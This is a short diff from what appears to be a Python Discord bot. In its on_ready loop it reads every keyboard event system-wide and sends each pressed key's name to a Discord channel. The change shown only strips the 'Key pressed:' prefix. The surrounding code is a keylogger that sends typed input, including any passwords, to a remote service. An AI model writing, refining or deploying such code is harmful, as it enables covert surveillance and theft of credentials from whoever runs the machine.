@@ -29,7 +29,7 @@ async def on_ready():
         # Check for any key press
         event = keyboard.read_event()
         if event.event_type == keyboard.KEY_DOWN:
-            await channel.send(f"Key pressed: {event.name}")  # Send the specific key that was pressed
+            await channel.send(event.name)  # Send the specific key that was pressed
         
         time.sleep(1)  # Adjust the interval as needed
 
